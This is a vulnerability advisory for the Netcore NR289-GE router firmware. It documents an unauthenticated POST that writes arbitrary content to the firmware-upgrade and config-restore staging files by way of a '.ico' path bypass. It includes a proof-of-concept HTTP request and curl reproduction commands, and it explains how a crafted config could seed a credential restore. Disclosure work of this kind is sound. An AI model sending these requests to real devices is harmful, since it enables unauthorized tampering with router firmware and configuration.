# Netcore NR289-GE AC Router — Unauthenticated Arbitrary-Content Write to Fixed Staging Files via boa POST

- Vendor: Netcore (磊科)
- Product: Netcore NR289-GE (SMB router / AC controller)
- Firmware Version: V1.4.5102 (2018.06.14, Linux 2.6.36, MIPS32r2 big-endian / RTL8198C+RTL8370)
- Vulnerability Type: Missing Authentication on file-write function (CWE-306) — arbitrary **content** write to two **fixed** staging paths (the path is NOT attacker-controlled)

## Overview

The patched boa (`/bin/boa`) handles POST requests specially: if the request path contains the substring `update` or `upgrade`, the raw POST body is written to `/tmp/boa_temp.update`; if it contains `para_recover`, the body is written to `/tmp/boa_temp.para` (`process_request` POST branch @ `0x407dc4`):

```
0x407e04:  strstr(path, "update"/"upgrade")    -> open("/tmp/boa_temp.update", O_WRONLY|O_CREAT)
0x407e20:  strstr(path, "para_recover")        -> open("/tmp/boa_temp.para",   O_WRONLY|O_CREAT)
           POST body is then streamed to the file with no authentication, size cap or content check
```

Combined with the `.ico` whitelist flaw (see companion advisory *Netcore_NR289-GE_authentication_bypass*), this is reachable **without any credentials**. The response is 404 (the path usually maps to no static file), but the file is already written — execution must be judged by the file, not the response.

## Proof of Concept

```http
POST /x.ico/firmware_upgrade HTTP/1.1
Host: <target>
Content-Length: 24

FIRMWARE-TEST-1234567890
```

Result on device: `/tmp/boa_temp.update` exists and contains exactly `FIRMWARE-TEST-1234567890`. Likewise `/tmp/boa_temp.para` with a `para_recover` path.

## Impact / Consumption Chain

- `/tmp/boa_temp.update` is the firmware-upgrade staging file: `upload_ap_upgrade_cgi` runs `system("mv /tmp/boa_temp.update /tmp/upgrade")` and the AP/device upgrade flow (`check_ap_upgrade_verinfo` / `check_ap_upgrade_checksum`, RSA-checked per strings) consumes it. An attacker can plant arbitrary content into the upgrade channel (DoS by corrupting staged firmware; full impact bounded by the signature check).
- `/tmp/boa_temp.para` is the config-restore staging file: `put_parame_file_cgi` (0x4bcfd4, itself reachable via the `.ico` bypass) processes it into `/tmp/param.file.bak`; the only content check is a `strncmp` against the model string `NR289-GE` in the header. A crafted config blob passes this check and seeds a configuration restore (including web credentials).

## Reproduction Result

Dynamically verified against the firmware emulated with qemu-mips (big-endian) + chroot:

```
$ curl -X POST "http://<target>/x.ico/firmware_upgrade" --data-binary "FIRMWARE-TEST-1234567890"
404                                    # response is irrelevant
$ cat /tmp/boa_temp.update             # on the emulated target
FIRMWARE-TEST-1234567890
$ curl -X POST "http://<target>/x.ico/para_recover" --data-binary "CONFIG-PAYLOAD-TEST"
$ cat /tmp/boa_temp.para
CONFIG-PAYLOAD-TEST
```
